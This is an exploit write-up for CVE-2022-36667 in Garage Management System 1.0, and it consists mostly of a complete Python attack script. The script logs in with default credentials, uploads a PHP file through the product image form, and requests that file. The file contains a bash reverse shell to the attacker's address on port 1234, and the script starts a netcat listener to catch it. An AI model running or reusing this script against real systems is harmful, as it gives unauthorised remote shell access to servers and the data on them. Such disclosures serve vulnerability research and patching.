# CVE-2022-36667
Writeup for [PacketStorm](https://packetstormsecurity.com/files/167802/Garage-Management-System-1.0-Shell-Upload.html)

## Garage Management System Remote Code Execution (RCE) via File Upload

<p># Date: 24/07/2022

<p># Exploit Author: saitamang

<!-- <p># Vendor Homepage: https://www.sourcecodester.com

<p># Software Link: https://www.sourcecodester.com/sites/default/files/download/mayuri_k/garage.zip -->

<p># Version: 1.0

<p># Tested on: Centos 7 + MySQL

<br>The automation script can be downloaded [here](https://github.com/saitamang/POC-DUMP/blob/main/Garage%20Management%20System/rce.py)

```
import requests, subprocess, string, sys, warnings, time, concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from netifaces import interfaces, ifaddresses, AF_INET

req = requests.Session()

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080',
    }

def login(ip,username,password):  
    target = "http://%s/garage/garage/login.php" %ip
    data = {'username':username,'password':password, 'login':''}
    response = req.post(target, data=data)

    if 'Login Successfully' in response.text:
        print("[$] Success Login :)")
        trigger_rce(req)
    else:
        print("[$] Failed Login :(")

def creata_rs():
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        if ifaceName=="eth0":
            ipadd = ' '.join(addresses)
            f = open("saitamang.php", "w")
            payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+str(ipadd)+"/1234 0>&1'\")?>"
            f.write(payload)
            f.close()
        else:
            pass

def trigger_rce(req):
    creata_rs()
    target = "http://%s/garage/garage/php_action/createProduct.php" %ip

    multipart_form_data = {
    "currnt_date": (None,""),
    "productImage": ("saitamang.php", open("saitamang.php", "rb")),
    "productName" : (None,"test"),
    "quantity" : (None,"1"),
    "rate" : (None,"1"),
    "brandName" : (None,"1"),
    "categoryName" : (None,"1"),
    "productStatus" : (None,"1"),
    "create" : (None,"")
    }

    response = req.post(target, files=multipart_form_data)

    print("[$] Enjoy your RCE :)")
    req.get("http://%s/garage/garage/assets/myimages/saitamang.php" %ip)


if __name__ == "__main__":
    print("   _____       _ __                                   ")
    print("  / ___/____ _(_) /_____ _____ ___  ____ _____  ____ _")
    print("  \__ \/ __ `/ / __/ __ `/ __ `__ \/ __ `/ __ \/ __ `/")
    print(" ___/ / /_/ / / /_/ /_/ / / / / / / /_/ / / / / /_/ / ")
    print("/____/\__,_/_/\__/\__,_/_/ /_/ /_/\__,_/_/ /_/\__, /  ")
    print("                                             /____/   \n\n")
    
    try:
        ip = sys.argv[1].strip()

        username = "mayuri.infospace@gmail.com"
        password = "rootadmin"

        subprocess.call(['terminator', '-e', 'nc -lvp 1234'])
        time.sleep(2)
        login(ip,username,password)
        
    except IndexError:
        print("[-] Usage %s <ip>" % sys.argv[0])
        print("[-] Example: %s 192.168.100.x" % sys.argv[0])
    sys.exit(-1)
```

